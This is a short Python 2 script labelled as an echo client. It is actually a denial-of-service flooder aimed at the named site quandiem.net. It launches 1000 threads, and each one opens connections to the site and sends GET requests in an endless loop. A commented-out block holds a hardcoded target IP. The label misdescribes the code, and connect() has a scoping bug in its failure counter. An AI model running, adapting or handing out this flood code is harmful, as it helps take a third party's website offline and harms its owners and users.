# Echo client program
import socket
import sys
import time
import pprint
import threading
import urllib2

HOST = 'quandiem.net'
PORT = 80
PATH = 'http://quandiem.net/'
count = 0
canconnect = 0
starttime = time.time()

# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# s.connect(('103.1.175.1', PORT))

# s.send("GET %s\r\n" % PATH)
# data  = s.recv(1024)
# print data
# sys.exit(1)
# socket.send("GET %s\r\n" % self.path)

class Request(threading.Thread):

    def __init__(self, host, port, path):
        self.host = host
        self.port = port
        self.path = path
        threading.Thread.__init__(self)

    def connect(self):
        s = None
        for res in socket.getaddrinfo(HOST, PORT, socket.AF_INET, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res

        try:
            s = socket.socket(af, socktype, proto)
        except socket.error as msg:
            s = None
        try:
            s.connect(sa)
        except socket.error as msg:
            s.close()
            s = None
        if s is None:
            canconnect = canconnect + 1
            return False
        self.socket = s;
        return True

    def run(self):
        global count
        global canconnect

        while True:
            try:
                if self.connect():
                    self.socket.send("GET %s\r\n" % self.path)
                    self.socket.recv(2)
                    self.socket.close()
                    count = count + 1
            except Exception, ex:
                print ex
                canconnect = canconnect + 1

print 'START PROGRAM'
for i in range(1000):
    request = Request(HOST, PORT, PATH)
    request.daemon = True
    request.start()
    print "Total thread %d \r" % i,
print '\n'
threadCount = 2
while threadCount > 1:
    threadCount = threading.activeCount()
    # print "Total request: %d, Fail: %d Total Thread: %d remaining... %d\r" % (count, canconnect, threadCount, time.time() - starttime),
    
print '\n'
    
